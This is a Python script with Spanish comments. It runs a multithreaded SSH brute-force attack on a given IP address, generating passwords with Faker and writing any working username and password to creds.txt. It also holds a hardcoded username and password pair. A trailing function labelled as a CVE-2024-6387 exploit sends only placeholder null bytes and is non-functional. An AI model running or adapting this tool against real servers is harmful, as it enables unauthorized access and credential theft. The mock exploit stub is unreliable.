import paramiko
import threading
import queue
import time
import socket
import random
import argparse
import sys
from faker import Faker

# Configuración inicial
fake = Faker()
q = queue.Queue()
found = False
lock = threading.Lock()
stop_threads = False

# Lista de usuarios comunes
default_users = ["493069k1"]

# Generador de contraseñas dinámicas
def generate_dynamic_payloads(num=1000):
    passwords = []
    common = ["bar1588623"]
    passwords.extend(common)
    
    for i in range(num):
        passwords.append(fake.password(length=random.randint(8, 12)))
        passwords.append(f"{fake.user_name()}{random.randint(1, 999)}")
        passwords.append(f"{fake.company().replace(' ', '')}{random.randint(2020, 2025)}")
    return list(set(passwords))

# Verificar si el puerto está abierto
def check_port_open(ip, port, timeout=3):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except:
        return False

# Conectar y probar credenciales
def try_ssh(ip, port, user, pwd):
    global found, stop_threads
    if stop_threads:
        return False
        
    client = None
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        # Configurar timeout más corto para evitar bloqueos
        client.connect(
            ip, 
            port=port, 
            username=user, 
            password=pwd, 
            timeout=5,
            banner_timeout=5,
            auth_timeout=5
        )
        
        with lock:
            if not found:
                print(f"[+] ¡Éxito! Login encontrado: {user}:{pwd}")
                found = True
                stop_threads = True
                with open("creds.txt","a") as f:
                    f.write(f"{ip}:{port} - {user}:{pwd}\n")
        return True
        
    except paramiko.AuthenticationException:
        # Autenticación fallida - esto es normal
        return False
    except paramiko.SSHException as e:
        # Error de SSH - ignorar silenciosamente
        return False
    except socket.error as e:
        # Error de socket - ignorar
        return False
    except Exception as e:
        # Otros errores - ignorar
        return False
    finally:
        if client:
            try:
                client.close()
            except:
                pass

# Worker para hilos
def worker(ip, port):
    global stop_threads
    while not q.empty() and not stop_threads:
        try:
            user, pwd = q.get(timeout=1)
            if try_ssh(ip, port, user, pwd):
                break
            q.task_done()
        except queue.Empty:
            break
        except Exception as e:
            # Ignorar errores en workers
            continue

# Escanear versión de SSH
def scan_ssh_version(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((ip, port))
        sock.send(b"SSH-2.0-Test\n")
        banner = sock.recv(1024).decode().strip()
        sock.close()
        print(f"[*] Versión SSH: {banner}")
        return banner
    except Exception as e:
        print(f"[!] No se pudo obtener la versión SSH: {e}")
        return None

# Main
def main(ip, port, threads, user_list, pass_list):
    global found, stop_threads
    
    print(f"[*] Iniciando ataque de fuerza bruta SSH en: {ip}:{port}")
    print(f"[*] Usando {threads} hilos")
    
    # Verificar si el puerto está abierto
    if not check_port_open(ip, port):
        print(f"[!] Puerto {port} no está abierto en {ip}")
        return
    
    banner = scan_ssh_version(ip, port)
    if not banner:
        print("[!] No se pudo obtener la versión SSH, pero continuando...")
    
    # Cargar usuarios y contraseñas
    try:
        users = default_users if not user_list else open(user_list,"r").read().splitlines()
        passwords = generate_dynamic_payloads() if not pass_list else open(pass_list,"r").read().splitlines()
    except Exception as e:
        print(f"[!] Error cargando archivos: {e}")
        return
    
    print(f"[*] Cargados {len(users)} usuarios y {len(passwords)} contraseñas")
    
    # Llenar la cola
    for user in users:
        for pwd in passwords:
            if stop_threads:
                break
            q.put((user, pwd))
    
    if q.empty():
        print("[!] No hay credenciales para probar")
        return
    
    # Iniciar hilos
    thread_list = []
    for i in range(threads):
        t = threading.Thread(target=worker, args=(ip, port))
        t.daemon = True  # Hilos daemon para que se cierren automáticamente
        t.start()
        thread_list.append(t)
    
    # Esperar a que terminen o se encuentre una credencial
    try:
        while not found and any(t.is_alive() for t in thread_list):
            time.sleep(0.1)
    except KeyboardInterrupt:
        print("\n[!] Interrumpido por el usuario")
        stop_threads = True
    
    # Esperar a que los hilos terminen
    for t in thread_list:
        if t.is_alive():
            t.join(timeout=1)
    
    if not found:
        print("[!] No se encontraron credenciales válidas")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Fuerza bruta SSH mejorada")
    parser.add_argument("ip", help="IP del servidor")
    parser.add_argument("--port", type=int, default=22, help="Puerto SSH")
    parser.add_argument("--threads", type=int, default=5, help="Número de hilos (reducido por defecto)")
    parser.add_argument("--users", help="Archivo con lista de usuarios")
    parser.add_argument("--passwords", help="Archivo con lista de contraseñas")
    args = parser.parse_args()
    
    try:
        main(args.ip, args.port, args.threads, args.users, args.passwords)
    except KeyboardInterrupt:
        print("\n[!] Script interrumpido")
        sys.exit(0)
    except Exception as e:
        print(f"[!] Error inesperado: {e}")
        sys.exit(1)
    
    
def try_cve_2024_6387(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((ip, port))
        payload = b"SSH-2.0-OpenSSH_8.9\n" + b"\x00" * 1000  # Reemplaza con PoC real
        sock.send(payload)
        response = sock.recv(1024)
        print(f"[*] Exploit CVE-2024-6387 enviado, respuesta: {response.decode()}")
        sock.close()
        return True
    except:
        print("[!] Exploit CVE-2024-6387 falló")
        return False

